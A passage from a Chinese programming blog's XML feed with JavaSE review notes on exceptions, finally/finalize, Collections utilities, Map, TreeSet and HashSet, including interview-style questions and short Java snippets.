class="headerlink" title="finally关键字的面试题："></a>finally关键字的面试题：</h3><ul><li><p><strong>final，finally和finalize的区别</strong></p><blockquote><p>解答：<br><strong>final：</strong><br>修饰类不能被继承，修饰方法不能被重写，修饰变量只能赋值一次（常量）</p><p><strong>finally：</strong><br>它是tyr语句中的语句体，不能单独使用，它用来释放资源</p><p><strong>finalize：</strong><br>是一个方法，当垃圾回收器确定不存在对该对象的引用时，对象的垃圾回收器调用此方法。<br>ps：他们三没任何联系，只是长得像而已。</p></blockquote></li><li><p><strong>如果catch里面有return语句，请问finally的代码还会执行吗?如果会请问时在return前还是return后？</strong></p><blockquote><p>解答：<br>会，并且是在return之后执行，因为在return相当于已经建立好了一个返回路径，然后再执行finally，然后再根据之前建立的返回路径彻底返回。</p><p>ps：千万不要再finally内写返回语句，因为finally的作用是为了释放资源，如果再这里写返回语句，那么try和catch的结果都会被改变。</p></blockquote></li></ul><h3 id="自定义异常方法"><a href="#自定义异常方法" class="headerlink" title="自定义异常方法"></a>自定义异常方法</h3><blockquote><p>定义一个异常类，然后继承Exception并重写构造方法即可</p></blockquote><h3 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AgeOutOfBoundsException</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">public <span class="type">AgeOutOfBoundsException</span>() &#123;</span><br><span class="line"><span class="keyword">super</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="type">AgeOutOfBoundsException</span>(<span class="type">String</span> message) &#123;</span><br><span class="line"><span class="keyword">super</span>(message);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为什么要自定义异常？"><a href="#为什么要自定义异常？" class="headerlink" title="为什么要自定义异常？"></a>为什么要自定义异常？</h3><ul><li>解答：<blockquote><p>只是为了看那个异常类的名字而已，这样好排错。</p><p>ps：继承RuntimeException的话可以不用在声明方法那里抛出异常</p></blockquote></li></ul><h3 id="异常注意事项"><a href="#异常注意事项" class="headerlink" title="异常注意事项"></a>异常注意事项</h3><blockquote><p>1、子类重写父类方法时，<code>子类必须抛出相同异常或者父类异常的子类</code>，也就是说<code>子类抛出的异常不能比父类大</code>，需要比父类更加细，打个比方，父亲坏儿子不能比他更坏。父亲没坏儿子自己处理</p><p>2、如果父类抛出多个异常，子类重写父类的时候<code>子类不能抛出父类没有的异常</code></p><p>3、如果被重写的方法没有抛出异常，那么子类绝对不可以抛出异常，如果子类有异常只能用try不能throws抛出</p></blockquote><h3 id="如何使用异常处理？"><a href="#如何使用异常处理？" class="headerlink" title="如何使用异常处理？"></a>如何使用异常处理？</h3><ul><li>原则：<blockquote><p>如果该功能内部可以将问题处理，就用try，不能处理就用throws向上抛出，交给调用者处理</p></blockquote></li><li>区别：<blockquote><p>1、后面还有代码需要执行，就用try</p><p>2、如果后面不需要代码执行了，就用throw</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;异常的概述&quot;&gt;&lt;a href=&quot;#异常的概述&quot; class=&quot;headerlink&quot; title=&quot;异常的概述&quot;&gt;&lt;/a&gt;异常的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;异常就是java程序在运行过程中出现的错误&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;异常类&quot;&gt;&lt;a href=&quot;#异常类&quot; class=&quot;headerlink&quot; title=&quot;异常类&quot;&gt;&lt;/a&gt;异常类&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Throwable&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;异常的继承体系：&quot;&gt;&lt;a href=&quot;#异常的继承体系：&quot; class=&quot;headerlink&quot; title=&quot;异常的继承体系：&quot;&gt;&lt;/a&gt;异常的继承体系：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Throwable&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Error&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;服务器出问提，数据库崩溃等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Exception&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;RuntimeException&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个是运行时异常，全部的运行时异常都在这，一般都是我们自己犯的错误，修改代码即可&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;。。。。。等等&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="异常" scheme="http://liuhaoan.github.io/tags/%E5%BC%82%E5%B8%B8/"/>
    
      <category term="throw" scheme="http://liuhaoan.github.io/tags/throw/"/>
    
      <category term="throws" scheme="http://liuhaoan.github.io/tags/throws/"/>
    
      <category term="final，finally和finalize的区别面试题" scheme="http://liuhaoan.github.io/tags/final%EF%BC%8Cfinally%E5%92%8Cfinalize%E7%9A%84%E5%8C%BA%E5%88%AB%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Collections工具类与集合总结</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Collections%E5%B7%A5%E5%85%B7%E7%B1%BB%E4%B8%8E%E9%9B%86%E5%90%88%E6%80%BB%E7%BB%93/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——Collections工具类与集合总结/</id>
    <published>2019-04-10T03:18:32.000Z</published>
    <updated>2019-04-10T03:48:11.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Collections中的常用方法"><a href="#Collections中的常用方法" class="headerlink" title="Collections中的常用方法"></a>Collections中的常用方法</h1><ul><li><p>Collections.sort(list)</p><blockquote><p>把集合进行排序</p></blockquote></li><li><p>Collections.banarySearch(list, 需要查的元素)</p><blockquote><p>用二分查找法查询某个集合中的元素，二分查找法前提是集合是有序的，找不到返回-(插入点 - 1）</p></blockquote></li><li><p>Collections.max(list)</p><blockquote><p>根据默认排序返回集合中最大的元素</p></blockquote></li></ul><a id="more"></a><ul><li><p>Collections.min(list)</p><blockquote><p>根据默认排序返回集合中最小的元素</p></blockquote></li><li><p>Collections.reverse(list)</p><blockquote><p>反转集合</p></blockquote></li><li><p>Collections.shuffle(list)</p><blockquote><p>随机置换，可以洗牌。</p></blockquote></li></ul><h1 id="集合总结"><a href="#集合总结" class="headerlink" title="集合总结"></a>集合总结</h1><ul><li><p>Collection</p><ul><li><p>List(存取有序,有索引,可以重复)</p><ul><li>ArrayList<blockquote><p>底层是数组实现的,线程不安全,查找和修改快,增和删比较慢</p></blockquote></li><li>LinkedList<blockquote><p>底层是链表实现的,线程不安全,增和删比较快,查找和修改比较慢</p></blockquote></li><li>Vector<blockquote><p>底层是数组实现的,线程安全的,无论增删改查都慢</p><p>如果查找和修改多,用ArrayList<br>如果增和删多,用LinkedList<br>如果都多,用ArrayList</p></blockquote></li></ul></li><li><p>Set(存取无序,无索引,不可以重复)</p><ul><li>HashSet<blockquote><p>底层是哈希算法实现</p><ul><li>LinkedHashSet<br>底层是链表实现,但是也是可以保证元素唯一,和HashSet原理一样</li></ul></blockquote></li><li>TreeSet<blockquote><p>底层是二叉树算法实现</p><p>一般在开发的时候<code>不需要对存储的元素排序</code>,所以在开发的时候大多用<code>HashSet,HashSet</code>的效率比较高</p><p>TreeSet在<code>面试的时候</code>比较多,问你有几种排序方式,和几种排序方式的区别</p></blockquote></li></ul></li></ul></li></ul><ul><li>Map<ul><li>HashMap<blockquote><p>底层是哈希算法,针对键</p><ul><li>LinkedHashMap<br>底层是链表,针对键</li></ul></blockquote></li><li>TreeMap<blockquote><p>底层是二叉树算法,针对键</p></blockquote></li></ul></li></ul><p><strong>ps：开发中用HashMap比较多</strong></p><h1 id="面试题之——TreeSet或者TreeMap有几种排序方式和区别"><a href="#面试题之——TreeSet或者TreeMap有几种排序方式和区别" class="headerlink" title="面试题之——TreeSet或者TreeMap有几种排序方式和区别"></a>面试题之——TreeSet或者TreeMap有<code>几种排序方式</code>和<code>区别</code></h1><h3 id="TreeSet或者TreeMap排序的两种方式"><a href="#TreeSet或者TreeMap排序的两种方式" class="headerlink" title="TreeSet或者TreeMap排序的两种方式"></a>TreeSet或者TreeMap排序的两种方式</h3><ul><li><p>第一种</p><blockquote><p>构造TreeSet集合什么都不传，就默认使用类中的Comparable的顺序，也就是compareTo方法。（传入集合的自定义对象实现了Comparable接口则用自定义类中重写的compareTo方法）</p></blockquote></li><li><p>第二种</p><blockquote><p>构造TreeSet集合传入Comparator比较器，那么优先按照比较器顺序排序。</p></blockquote></li></ul><p>引用自<a href="/2019/04/10/javaSE复习之——TreeSet类/">javaSE复习之——TreeSet类</a></p><ul><li>ps：<blockquote><p>1、在开发中，<code>单列集合存储重复元素优先考虑ArrayList</code>，<code>不重复的元素优先考虑HashSet</code>，<code>双列集合直接考虑HashMap</code> </p><p>2、单列集合（collection）中Set集合类型其实底层都依赖map集合，它封装了map集合，当中只使用到了key，而value用固定的值替代(Object对象)。</p><p>3、tree类型的map和set集合平时都不常用，但是<strong><code>面试会用</code></strong>，一般问你有<strong><code>几种排序方式</code></strong>,和<strong><code>几种排序方式的区别</code></strong></p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Collections中的常用方法&quot;&gt;&lt;a href=&quot;#Collections中的常用方法&quot; class=&quot;headerlink&quot; title=&quot;Collections中的常用方法&quot;&gt;&lt;/a&gt;Collections中的常用方法&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Collections.sort(list)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;把集合进行排序&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Collections.banarySearch(list, 需要查的元素)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;用二分查找法查询某个集合中的元素，二分查找法前提是集合是有序的，找不到返回-(插入点 - 1）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Collections.max(list)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;根据默认排序返回集合中最大的元素&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="集合总结" scheme="http://liuhaoan.github.io/tags/%E9%9B%86%E5%90%88%E6%80%BB%E7%BB%93/"/>
    
      <category term="Collections工具类" scheme="http://liuhaoan.github.io/tags/Collections%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
    
      <category term="面试题之——TreeSet或者TreeMap有几种排序方式和区别" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98%E4%B9%8B%E2%80%94%E2%80%94TreeSet%E6%88%96%E8%80%85TreeMap%E6%9C%89%E5%87%A0%E7%A7%8D%E6%8E%92%E5%BA%8F%E6%96%B9%E5%BC%8F%E5%92%8C%E5%8C%BA%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Map类</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Map%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——Map类/</id>
    <published>2019-04-10T02:54:56.000Z</published>
    <updated>2019-04-10T03:13:41.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="map集合的概述"><a href="#map集合的概述" class="headerlink" title="map集合的概述"></a>map集合的概述</h1><blockquote><p>它是将<strong>键</strong>映射到<strong>值</strong>的对象，类似python中的字典，<code>它是无序的</code>。</p></blockquote><a id="more"></a><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><blockquote><p>1、一个map对象不能包含重复的键</p><p>2、一个键只能映射到一个值</p><p>3、map接口的实现分为hashMap和treeMap<br>ps：只要是hash算法实现的集合，那么它都是无序的。</p><p>4、map集合不能直接进行迭代。</p><ul><li><p><strong>解决方法1（底层调用原map集合太多）</strong><br>利用keySet获取所有键的对象，然后迭代这个对象逐个get获取值，这样可以从侧面迭代map集合。<br>ps：利用增强for循环可以更简便的拿到map集合中的每个值。</p></li><li><p><strong>解决方法2（推荐使用）：</strong><br>利用entrySet方法获取一个键值对Entry对象，然后迭代或者增强for循环这个Entry对象然后逐个获取值即可。</p></li></ul><p><strong>注意事项：</strong><br>传入引用数据类型时，必须重写hashCode和equals方法</p></blockquote><h3 id="map和colllection的不同："><a href="#map和colllection的不同：" class="headerlink" title="map和colllection的不同："></a>map和colllection的不同：</h3><blockquote><p>1、map是双列的，collection是单列的</p><p>2、map键唯一，collection只有它的子体系Set是唯一的<br><strong>ps：</strong>其实set集合是依赖与map的hash算法的，只是set集合中把map集合封装了一下，里面只使用了键，而值用object对象填充</p><p>3、Map的数据结构只针对键有效，和值无关；collection的数据结构针对元素有效</p></blockquote><h3 id="创建map对象"><a href="#创建map对象" class="headerlink" title="创建map对象"></a>创建map对象</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">String</span>, <span class="built_in">Integer</span>&gt; <span class="built_in">map</span> = <span class="literal">new</span> hashMap&lt;&gt;();</span><br></pre></td></tr></table></figure><h3 id="map集合中的方法"><a href="#map集合中的方法" class="headerlink" title="map集合中的方法"></a>map集合中的方法</h3><ul><li>添加方法：<blockquote><p>.put(key, value)<br>向map集合中添加一个键值对元素，新添加返回null，覆盖返回被覆盖的值</p></blockquote></li><li>删除方法：<blockquote><p>.clear()<br>删除全部键值对元素</p><p>.remove(key)<br>删除指定键对应的键值对</p></blockquote></li><li>判断方法：<blockquote><p>.containsKey(key)<br>判断集合中是否包含指定的键</p><p>.containsValue(value)<br>判断集合中是否包含指定的值</p><p>.isEmpty()<br>判断集合是否为空</p></blockquote></li><li>获取功能：<blockquote><p>.entrySet()<br>拿到map集合的键值对象，返回set&lt;map.Entry&lt;K,V&gt;&gt;<br>ps：Map.Entry是Map接口的内部接口，它实现了将键和值封装成了一个Entry对象，储存再Set集合中。</p><p>.get(key)<br>根据键获取值 </p><p>.keySet()<br>获取集合中所有键的集合，返回Set<k></k></p><p>.values()<br>获取集合中所有值的集合，返回Collection<v></v></p></blockquote></li><li>长度功能：<blockquote><p>.size()<br>返回键值对个数</p></blockquote></li></ul><h3 id="linkedHashMap特点"><a href="#linkedHashMap特点" class="headerlink" title="linkedHashMap特点"></a>linkedHashMap特点</h3><blockquote><p>它是有序的，怎么存就怎么打印</p></blockquote><h3 id="TreeMap特点："><a href="#TreeMap特点：" class="headerlink" title="TreeMap特点："></a>TreeMap特点：</h3><blockquote><p>1、可以用来排序，值是唯一的，等等</p><p>2、传入引用数据类型时，必须重写compareTo方法，否则无法判断值的唯一性，会报错。</p><p>3、具体笔记在<a href="/2019/04/10/javaSE复习之——TreeSet类/">TreeSet集合</a>中介绍</p></blockquote><h3 id="hashtable和hashMap区别（面试题）："><a href="#hashtable和hashMap区别（面试题）：" class="headerlink" title="hashtable和hashMap区别（面试题）："></a>hashtable和hashMap区别（面试题）：</h3><ul><li>共同点：<blockquote><p>1、底层都依赖hash算法</p><p>2、都是双列集合</p></blockquote></li></ul><ul><li>不同点：<blockquote><p>1、HashMap是<code>线程不安全的</code>，效率高，jdk1.2版本出现的</p><p>2、Hashtable是<code>线程安全的</code>，效率相对第，jdk1.0版本出现的</p><p>3、HashMaop<code>可以</code>储存<strong>null键</strong>和<strong>null值</strong></p><p>4、Hashtable<code>不可以</code>储存<strong>null键</strong>和<strong>null值</strong></p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;map集合的概述&quot;&gt;&lt;a href=&quot;#map集合的概述&quot; class=&quot;headerlink&quot; title=&quot;map集合的概述&quot;&gt;&lt;/a&gt;map集合的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它是将&lt;strong&gt;键&lt;/strong&gt;映射到&lt;strong&gt;值&lt;/strong&gt;的对象，类似python中的字典，&lt;code&gt;它是无序的&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Map类" scheme="http://liuhaoan.github.io/tags/Map%E7%B1%BB/"/>
    
      <category term="linkedHashMap类" scheme="http://liuhaoan.github.io/tags/linkedHashMap%E7%B1%BB/"/>
    
      <category term="TreeMap类" scheme="http://liuhaoan.github.io/tags/TreeMap%E7%B1%BB/"/>
    
      <category term="hashtable和hashMap区别（面试题）" scheme="http://liuhaoan.github.io/tags/hashtable%E5%92%8ChashMap%E5%8C%BA%E5%88%AB%EF%BC%88%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——TreeSet类</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94TreeSet%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——TreeSet类/</id>
    <published>2019-04-10T02:32:14.000Z</published>
    <updated>2019-04-10T02:54:13.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TreeSet的概述"><a href="#TreeSet的概述" class="headerlink" title="TreeSet的概述"></a>TreeSet的概述</h1><blockquote><p>它是一个<code>二叉树集合</code>，<code>小的（负数）放在左边</code>，<code>大的（正数）放在右边</code>，并且对集合元素进行排序，并且<code>可以保证元素的唯一性</code>，也就是去除重复，它的主要功能是排序。<strong>它依赖map集合</strong></p></blockquote><a id="more"></a><h3 id="TreeSet特点："><a href="#TreeSet特点：" class="headerlink" title="TreeSet特点："></a>TreeSet特点：</h3><ul><li>TreeSet集合存储元素取决于<code>compareTo方法</code>的<strong>返回值</strong>。<blockquote><p><strong>返回0：</strong><br>表示作比较的两个对象是相等的，这时集合不存这个元素。</p><p><strong>返回负数：</strong><br>表示要存入的元素小于上一个作比较元素，然后把这个元素放在作比较元素的左边，如果它的左边还有元素就再进行比较</p><p><strong>返回正数：</strong><br>表示大于上一个元素，这时把这个元素放在上一个元素的右边，如果右边还有元素，就再进行比较。</p></blockquote></li></ul><h3 id="TreeSet存元素的原理"><a href="#TreeSet存元素的原理" class="headerlink" title="TreeSet存元素的原理"></a>TreeSet存元素的原理</h3><blockquote><p>首先存入第一个元素（根元素），然后再存入第二个元素时调用<code>compareTo方法</code>取到<strong>返回值</strong>，然后根据返回值存元素；</p><p>如果之前已经存了n个元素，那么调用compareTo逐次与每个元素作比较，</p></blockquote><h3 id="TreeSet取元素原理"><a href="#TreeSet取元素原理" class="headerlink" title="TreeSet取元素原理"></a>TreeSet取元素原理</h3><blockquote><p>从最小的开始取，也就是从左向右取，<code>先取根元素左边的元素</code>，如果根元素左边的元素下面还有元素就先从那里开始取，这里也是从左到右的原理，取根元素右边元素也是同理，从左边向右边取元素，如果左边或右边元素下面还有元素，那么也是遵循从左到右的原则。</p><p><strong>注意：</strong>左边元素全部取完后再慢慢向右边取</p></blockquote><h4 id="为什么存入自定义对象的时候会报错？"><a href="#为什么存入自定义对象的时候会报错？" class="headerlink" title="为什么存入自定义对象的时候会报错？"></a>为什么存入自定义对象的时候会报错？</h4><ul><li><strong>原因：</strong><blockquote><p>因为TreeSet会对集合元素进行排序，而它不知道自定义对象按照什么方法来排序，所以会报错。</p></blockquote></li><li><strong>解决方法：</strong><blockquote><p>让自定义对象这个类去实现Comparable接口，然后重写compareTo方法，此方法返回0则集合只能存一个对象，返回1按照存的顺序排序，返回-1按照存的顺序的倒叙存。</p></blockquote></li></ul><h3 id="重写compareTo例子"><a href="#重写compareTo例子" class="headerlink" title="重写compareTo例子"></a>重写compareTo例子</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> compareTo(Student o) &#123;</span><br><span class="line"><span class="keyword">int</span> num = o.<span class="keyword">sum</span> - <span class="keyword">this</span>.<span class="keyword">sum</span>;</span><br><span class="line"><span class="keyword">return</span> num == <span class="number">0</span> ? <span class="number">1</span> : num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ps：比较字符串可以调用字符串的conpareTo方法比较</strong></p><h1 id="TreeSet比较器Comparator的概述"><a href="#TreeSet比较器Comparator的概述" class="headerlink" title="TreeSet比较器Comparator的概述"></a>TreeSet比较器Comparator的概述</h1><blockquote><p>可以自定义对TreeSet集合进行排序</p></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><blockquote><p>首先创建一个类并且让这个类<code>实现</code>Comparator接口，然后重写<code>compare</code>方法，最后在<code>创建TreeSet集合对象的时候</code>创建这个类的对象传入即可。</p></blockquote><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><blockquote><p>compare方法中第一个参数是调用的对象，第二个参数是被比较集合中的对象</p></blockquote><h3 id="两种排序方式的区别"><a href="#两种排序方式的区别" class="headerlink" title="两种排序方式的区别"></a>两种排序方式的区别</h3><blockquote><p>1、构造TreeSet集合什么都不传，就默认使用类中的Comparable的顺序，也就是compareTo方法。（传入集合的自定义对象实现了Comparable接口则用自定义类）</p><p>2、构造TreeSet集合传入Comparator比较器，那么优先按照比较器顺序排序。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;TreeSet的概述&quot;&gt;&lt;a href=&quot;#TreeSet的概述&quot; class=&quot;headerlink&quot; title=&quot;TreeSet的概述&quot;&gt;&lt;/a&gt;TreeSet的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;它是一个&lt;code&gt;二叉树集合&lt;/code&gt;，&lt;code&gt;小的（负数）放在左边&lt;/code&gt;，&lt;code&gt;大的（正数）放在右边&lt;/code&gt;，并且对集合元素进行排序，并且&lt;code&gt;可以保证元素的唯一性&lt;/code&gt;，也就是去除重复，它的主要功能是排序。&lt;strong&gt;它依赖map集合&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="TreeSet类" scheme="http://liuhaoan.github.io/tags/TreeSet%E7%B1%BB/"/>
    
      <category term="Comparator比较器" scheme="http://liuhaoan.github.io/tags/Comparator%E6%AF%94%E8%BE%83%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——HashSet类</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94HashSet%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——HashSet类/</id>
    <published>2019-04-10T02:09:18.000Z</published>
    <updated>2019-04-10T02:33:09.875Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p>他没有自己特殊的方法，它的方法和<a href="/2019/04/09/javaSE复习之——Collection集合框架/">Collection</a>一样，HashSet集合<code>不能存重复的数据</code>，并且是<code>无顺序</code>的。</p></blockquote><h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><blockquote><p>1、没有索引</p><p>2、不可以重复</p><p>3、无顺序（存和取不一致）</p></blockquote><a id="more"></a><h3 id="为为什么要存储自定义对象"><a href="#为为什么要存储自定义对象" class="headerlink" title="为为什么要存储自定义对象"></a>为为什么要存储自定义对象</h3><blockquote><p>因为别人的类我们不知道它重写了哪些方法来保证元素的一致性。</p></blockquote><h3 id="HashSet集合存集合的原理"><a href="#HashSet集合存集合的原理" class="headerlink" title="HashSet集合存集合的原理"></a>HashSet集合存集合的原理</h3><blockquote><p>加入每个元素都会先调用<code>hashCold</code>方法来生成一个Hash值，这个值就相当于存那个元素的地址，如果hash值不一样就<code>不会调用equals方法</code>判断，如果hash值相同就通过equals方法对比在<code>同一个地址中</code>的数据是不是相同的，相同丢弃不相同就存入。</p></blockquote><h3 id="HashSet中遇到的常见问题："><a href="#HashSet中遇到的常见问题：" class="headerlink" title="HashSet中遇到的常见问题："></a>HashSet中遇到的常见问题：</h3><ul><li>为什么在集合中存入自定义对象的时候<code>重复的数据</code>也会被存进去？<blockquote><p><strong>原因1:</strong><br>因为父类的hashCold方法会为每一个元素生成不一样的hash值，所以导致<code>地址不一样</code></p><p><strong>原因2:</strong><br>父类的equals方法对比的时对象的地址，而不是对象里面的值</p><p><strong>解决方法：</strong><br>在自定义的类中重写equals方法和hashCold方法</p></blockquote></li></ul><h3 id="为什么尽量使用计算hash值的方法来判断两个我们知道相等的对象是否相等？"><a href="#为什么尽量使用计算hash值的方法来判断两个我们知道相等的对象是否相等？" class="headerlink" title="为什么尽量使用计算hash值的方法来判断两个我们知道相等的对象是否相等？"></a>为什么尽量使用<code>计算hash值</code>的方法来判断两个我们知道<code>相等的对象是否相等</code>？</h3><blockquote><p><strong>原因：</strong><br>HashSet集合加入元素的顺序是<code>先判断hash值</code>如果hash值一样就调用equals判断，如果我们用算法让<code>相同的对象值计算出相同的hash值</code>，<code>不同的对象值计算出不同的hash值</code>，那么就可以让程序<code>少调用一次equals方法</code>，这样可以提高效率。</p><p><strong>注意事项：</strong><br>重写hashCold方法时，<code>属性相同</code>的对象hash值一定要一样，<code>属性不一样</code>的对象hash值要<strong>尽量</strong>不一样（提高效率）</p></blockquote><h3 id="重写hashCold中的面试题："><a href="#重写hashCold中的面试题：" class="headerlink" title="重写hashCold中的面试题："></a>重写hashCold中的面试题：</h3><ul><li>为什么使用Eclipse重写的hashCold方法中，为了让传入对象计算的hash值不一样，而定义的一个用来算法计算的值是31？<blockquote><p><strong>原因1</strong>：它是一个质数，它只能被1和本省整除，这样可以减小两个对象计算的hash值相同的概率</p><p><strong>原因2</strong>：31这个数不大也不小，太小了计算的值容易重复，太大了容易超过int范围。</p><p><strong>原因3</strong>：31这个数好算，它是2的5次方-1，也就是2的二进制位向左移动5位。</p></blockquote></li></ul><h3 id="LinkedHashSet的概述"><a href="#LinkedHashSet的概述" class="headerlink" title="LinkedHashSet的概述"></a>LinkedHashSet的概述</h3><blockquote><p>它的底层是<code>链表</code>实现,并且是非线程安全的，也是Set集合中<code>唯一 一个</code>能保证怎么存就怎么取的集合对象，因为它的父类是HashSet，所以也是<code>保证元素唯一</code>的，它的原理与HashSet一样。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;他没有自己特殊的方法，它的方法和&lt;a href=&quot;/2019/04/09/javaSE复习之——Collection集合框架/&quot;&gt;Collection&lt;/a&gt;一样，HashSet集合&lt;code&gt;不能存重复的数据&lt;/code&gt;，并且是&lt;code&gt;无顺序&lt;/code&gt;的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;特点：&quot;&gt;&lt;a href=&quot;#特点：&quot; class=&quot;headerlink&quot; title=&quot;特点：&quot;&gt;&lt;/a&gt;特点：&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;1、没有索引&lt;/p&gt;
&lt;p&gt;2、不可以重复&lt;/p&gt;
&lt;p&gt;3、无顺序（存和取不一致）&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="HashSet类" scheme="http://liuhaoan.github.io/tags/HashSet%E7%B1%BB/"/>
    
      <category term="LinkedHashSet类" scheme="http://liuhaoan.github.io/tags/LinkedHashSet%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——增强for循环、JDK5新特性与可变参数</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A2%9E%E5%BC%BAfor%E5%BE%AA%E7%8E%AF%E3%80%81JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%B8%8E%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0/"/>
